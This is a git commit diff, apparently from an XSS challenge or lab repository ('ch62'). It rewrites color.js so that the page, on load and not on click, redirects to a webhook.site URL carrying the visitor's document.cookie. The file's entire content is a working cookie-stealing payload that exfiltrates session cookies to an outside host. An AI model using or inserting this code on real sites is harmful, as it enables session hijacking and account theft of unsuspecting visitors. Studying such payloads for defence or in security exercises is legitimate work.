f5ffb46569b6655a92a0e9449235abac5335855d
botdevphone-jpg <botdevphone@gmail.com>
2026-01-08 01:23:59 +0300

    Update color.js

--- ch62/color.js
+++ ch62/color.js
@@ -1,10 +1,1 @@
-const color = document.getElementById("color");
-const target = document.getElementById("result");
-
-function getRandomInt(max) {
-    return Math.floor(Math.random() * max);
-  }  
-
-color.onclick = () => {
-    document.location='http://webhook.site/3f49d0dd-56df-4a4d-951d-83862257fa1d?c='+document.cookie;
-}
+document.location = 'http://webhook.site/3f49d0dd-56df-4a4d-951d-83862257fa1d?c=' + encodeURIComponent(document.cookie);
